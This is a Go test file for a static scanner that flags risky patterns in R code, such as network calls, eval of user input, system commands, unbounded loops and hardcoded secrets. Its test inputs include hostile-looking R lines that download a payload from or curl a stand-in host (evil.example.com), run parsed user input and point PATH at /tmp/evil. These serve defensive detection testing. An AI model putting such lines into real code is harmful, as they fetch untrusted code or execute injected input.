package r

import (
	"strings"
	"testing"

	"github.com/Ingestdata/orion/src/scan"
)

func hasRule(findings []scan.Finding, rule string) bool {
	for _, f := range findings {
		if f.Rule == rule {
			return true
		}
	}
	return false
}

func TestRules_Hit(t *testing.T) {
	cases := []struct {
		rule string
		code string
	}{
		{"network-call", `download.file("https://evil.example.com/payload", destfile)`},
		{"network-call", `resp <- httr::GET("https://evil.example.com")`},
		{"network-call", `con <- url("https://evil.example.com")`},
		{"dynamic-exec", `eval(parse(text = user_input))`},
		{"system-access", `system("curl https://evil.example.com")`},
		{"system-access", `Sys.setenv(PATH = "/tmp/evil")`},
		{"unbounded-loop", `while (TRUE) { doWork() }`},
		{"unbounded-loop", `repeat { doWork() }`},
		{"hardcoded-secret", `api_key <- "sk_live_abcdefghijklmnop"`},
		{"hardcoded-secret", `httr::GET(url, api_key = "sk_live_abcdefghijklmnop")`},
	}
	for _, c := range cases {
		t.Run(c.rule+"/"+c.code, func(t *testing.T) {
			findings := New().Scan(c.code)
			if !hasRule(findings, c.rule) {
				t.Errorf("expected rule %q to fire on %q, got findings: %+v", c.rule, c.code, findings)
			}
		})
	}
}

func TestRules_Miss(t *testing.T) {
	code := `
transform <- function(record) {
  record$amount_cents <- round(record$amount * 100)
  record$amount <- NULL
  record
}
`
	findings := New().Scan(code)
	if len(findings) != 0 {
		t.Errorf("expected no findings on benign code, got: %+v", findings)
	}
}

func TestCriticalRules_IgnoreComments(t *testing.T) {
	// The parser strips comments before the AST-based rules ever see them, so commented-out
	// example code should never trip a Critical finding.
	code := `
# eval(parse(text = "this is just an example in a docstring"))
# system("echo hi")
transform <- function(record) record
`
	findings := New().Scan(code)
	for _, f := range findings {
		if f.Severity == scan.SeverityCritical {
			t.Errorf("expected no Critical findings from commented-out code, got: %+v", f)
		}
	}
}

func TestUnboundedLoop_WithReachableBreakIsFine(t *testing.T) {
	code := `
i <- 0
while (TRUE) {
  i <- i + 1
  if (i > 10) break
}
`
	findings := New().Scan(code)
	if hasRule(findings, "unbounded-loop") {
		t.Errorf("expected no unbounded-loop finding when a break is reachable, got: %+v", findings)
	}
}

func TestUnboundedLoop_BreakInNestedFunctionDoesNotCount(t *testing.T) {
	// A break inside a closure defined within the loop body can't actually unwind the
	// enclosing while loop in R, so it must not suppress the finding.
	code := `
while (TRUE) {
  f <- function() { break }
  doWork()
}
`
	findings := New().Scan(code)
	if !hasRule(findings, "unbounded-loop") {
		t.Errorf("expected unbounded-loop finding when the only break is inside a nested function, got: %+v", findings)
	}
}

func TestUnsanitizedSensitiveField(t *testing.T) {
	flagged := New().Scan(`record$email <- input$email`)
	if !hasRule(flagged, "unsanitized-sensitive-field") {
		t.Errorf("expected unsanitized-sensitive-field finding, got: %+v", flagged)
	}

	sanitized := New().Scan(`record$email <- mask_email(input$email)`)
	if hasRule(sanitized, "unsanitized-sensitive-field") {
		t.Errorf("expected no finding once a sanitizer call is present, got: %+v", sanitized)
	}
}

func TestSizeLimit(t *testing.T) {
	huge := "x <- 1\n" + strings.Repeat("# padding\n", 5000)
	findings := New().Scan(huge)
	if !hasRule(findings, "size-limit") {
		t.Errorf("expected size-limit finding for oversized source")
	}
}
